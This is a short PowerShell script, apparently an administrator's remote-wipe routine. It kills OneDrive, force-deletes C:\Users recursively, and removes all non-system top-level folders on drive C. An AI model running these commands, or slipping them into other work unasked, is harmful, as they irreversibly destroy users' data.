# Kill OneDrive to prevent removing data from OneDrive
Get-Process -Name *onedrive* | Stop-Process -Force

# Remove UserProfile Data
Remove-Item -Path C:\Users\ -Recurse -Force

$ExcludeList = @(
    '$Windows.~BT'
    'PerfLogs'
    'Program Files'
    'Program Files (x86)'
    'Users'
    'Windows'
)

# Exclude Windows System Path
$CDrive_File = Get-ChildItem C:\  | Where {$ExcludeList -notcontains $_.Name}

# Remove non-system files
$CDrive_File | % {
    $_ | Remove-Item -Recurse -Force
}

# Remote Wipe PC

